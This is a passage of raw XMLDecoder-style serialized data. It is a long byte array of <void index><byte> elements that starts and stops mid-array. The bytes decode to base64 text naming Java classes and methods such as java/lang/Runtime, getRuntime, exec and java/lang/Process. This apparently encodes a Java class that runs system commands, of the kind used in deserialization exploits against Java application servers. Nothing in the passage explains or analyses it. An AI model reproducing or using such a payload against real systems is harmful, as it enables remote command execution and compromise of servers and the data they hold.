&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="2841"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="2842"&gt; &lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="2843"&gt; &lt;byte&gt;113&lt;/byte&gt;&lt;/void&gt;&lt;void index="2844"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="2845"&gt; &lt;byte&gt;88&lt;/byte&gt;&lt;/void&gt;&lt;void index="2846"&gt; &lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="2847"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="2848"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="2849"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="2850"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="2851"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="2852"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="2853"&gt; &lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="2854"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="2855"&gt; &lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="2856"&gt; &lt;byte&gt;82&lt;/byte&gt;&lt;/void&gt;&lt;void index="2857"&gt; &lt;byte&gt;88&lt;/byte&gt;&lt;/void&gt;&lt;void index="2858"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="2859"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="2860"&gt; &lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="2861"&gt; &lt;byte&gt;88&lt;/byte&gt;&lt;/void&gt;&lt;void index="2862"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="2863"&gt; &lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="2864"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="2865"&gt; &lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="2866"&gt; &lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="2867"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="2868"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="2869"&gt; &lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="2870"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="2871"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="2872"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="2873"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="2874"&gt; &lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="2875"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="2876"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="2877"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="2878"&gt; &lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="2879"&gt; &lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="2880"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="2881"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="2882"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="2883"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="2884"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="2885"&gt; &lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="2886"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="2887"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="2888"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="2889"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="2890"&gt; &lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="2891"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="2892"&gt; &lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="2893"&gt; &lt;byte&gt;88&lt;/byte&gt;&lt;/void&gt;&lt;void index="2894"&gt; &lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="2895"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="2896"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="2897"&gt; &lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="2898"&gt; &lt;byte&gt;82&lt;/byte&gt;&lt;/void&gt;&lt;void index="2899"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="2900"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="2901"&gt; &lt;byte&gt;88&lt;/byte&gt;&lt;/void&gt;&lt;void index="2902"&gt; &lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="2903"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="2904"&gt; &lt;byte&gt;82&lt;/byte&gt;&lt;/void&gt;&lt;void index="2905"&gt; &lt;byte&gt;88&lt;/byte&gt;&lt;/void&gt;&lt;void index="2906"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="2907"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="2908"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="2909"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="2910"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="2911"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="2912"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="2913"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="2914"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="2915"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="2916"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="2917"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="2918"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="2919"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="2920"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="2921"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="2922"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="2923"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="2924"&gt; &lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="2925"&gt; &lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="2926"&gt; &lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="2927"&gt; &lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="2928"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="2929"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="2930"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="2931"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="2932"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="2933"&gt; &lt;byte&gt;51&lt;/byte&gt;&lt;/void&gt;&lt;void index="2934"&gt; &lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="2935"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="2936"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="2937"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="2938"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="2939"&gt; &lt;byte&gt;113&lt;/byte&gt;&lt;/void&gt;&lt;void index="2940"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="2941"&gt; &lt;byte&gt;88&lt;/byte&gt;&lt;/void&gt;&lt;void index="2942"&gt; &lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="2943"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="2944"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="2945"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="2946"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="2947"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="2948"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="2949"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="2950"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="2951"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="2952"&gt; &lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="2953"&gt; &lt;byte&gt;51&lt;/byte&gt;&lt;/void&gt;&lt;void index="2954"&gt; &lt;byte&gt;82&lt;/byte&gt;&lt;/void&gt;&lt;void index="2955"&gt; &lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="2956"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="2957"&gt; &lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="2958"&gt; &lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="2959"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="2960"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="2961"&gt; &lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="2962"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="2963"&gt; &lt;byte&gt;82&lt;/byte&gt;&lt;/void&gt;&lt;void index="2964"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="2965"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="2966"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="2967"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="2968"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="2969"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="2970"&gt; &lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="2971"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="2972"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="2973"&gt; &lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="2974"&gt; &lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="2975"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="2976"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="2977"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="2978"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="2979"&gt; &lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="2980"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="2981"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="2982"&gt; &lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="2983"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="2984"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="2985"&gt; &lt;byte&gt;51&lt;/byte&gt;&lt;/void&gt;&lt;void index="2986"&gt; &lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="2987"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="2988"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="2989"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="2990"&gt; &lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="2991"&gt; &lt;byte&gt;113&lt;/byte&gt;&lt;/void&gt;&lt;void index="2992"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="2993"&gt; &lt;byte&gt;88&lt;/byte&gt;&lt;/void&gt;&lt;void index="2994"&gt; &lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="2995"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="2996"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="2997"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="2998"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="2999"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="3000"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="3001"&gt; &lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3002"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="3003"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="3004"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="3005"&gt; &lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="3006"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="3007"&gt; &lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3008"&gt; &lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="3009"&gt; &lt;byte&gt;51&lt;/byte&gt;&lt;/void&gt;&lt;void index="3010"&gt; &lt;byte&gt;82&lt;/byte&gt;&lt;/void&gt;&lt;void index="3011"&gt; &lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="3012"&gt; &lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3013"&gt; &lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3014"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3015"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="3016"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3017"&gt; &lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="3018"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3019"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="3020"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="3021"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="3022"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3023"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="3024"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="3025"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="3026"&gt; &lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="3027"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="3028"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="3029"&gt; &lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3030"&gt; &lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="3031"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="3032"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="3033"&gt; &lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3034"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="3035"&gt; &lt;byte&gt;52&lt;/byte&gt;&lt;/void&gt;&lt;void index="3036"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="3037"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="3038"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="3039"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="3040"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="3041"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="3042"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="3043"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="3044"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="3045"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="3046"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3047"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3048"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3049"&gt; &lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3050"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="3051"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="3052"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="3053"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="3054"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3055"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="3056"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="3057"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="3058"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3059"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="3060"&gt; &lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3061"&gt; &lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="3062"&gt; &lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="3063"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="3064"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="3065"&gt; &lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3066"&gt; &lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="3067"&gt; &lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3068"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="3069"&gt; &lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3070"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="3071"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="3072"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3073"&gt; &lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="3074"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3075"&gt; &lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="3076"&gt; &lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3077"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="3078"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="3079"&gt; &lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3080"&gt; &lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="3081"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="3082"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="3083"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="3084"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="3085"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="3086"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="3087"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="3088"&gt; &lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3089"&gt; &lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="3090"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3091"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3092"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3093"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="3094"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="3095"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="3096"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="3097"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="3098"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="3099"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="3100"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="3101"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="3102"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3103"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="3104"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="3105"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="3106"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3107"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="3108"&gt; &lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3109"&gt; &lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="3110"&gt; &lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="3111"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="3112"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="3113"&gt; &lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3114"&gt; &lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="3115"&gt; &lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3116"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="3117"&gt; &lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3118"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="3119"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="3120"&gt; &lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="3121"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="3122"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3123"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3124"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="3125"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="3126"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="3127"&gt; &lt;byte&gt;52&lt;/byte&gt;&lt;/void&gt;&lt;void index="3128"&gt; &lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3129"&gt; &lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3130"&gt; &lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="3131"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="3132"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3133"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="3134"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="3135"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="3136"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="3137"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="3138"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="3139"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="3140"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="3141"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="3142"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3143"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="3144"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="3145"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="3146"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3147"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="3148"&gt; &lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3149"&gt; &lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="3150"&gt; &lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="3151"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="3152"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="3153"&gt; &lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="3154"&gt; &lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="3155"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="3156"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="3157"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="3158"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="3159"&gt; &lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="3160"&gt; &lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="3161"&gt; &lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="3162"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="3163"&gt; &lt;byte&gt;113&lt;/byte&gt;&lt;/void&gt;&lt;void index="3164"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="3165"&gt; &lt;byte&gt;88&lt;/byte&gt;&lt;/void&gt;&lt;void index="3166"&gt; 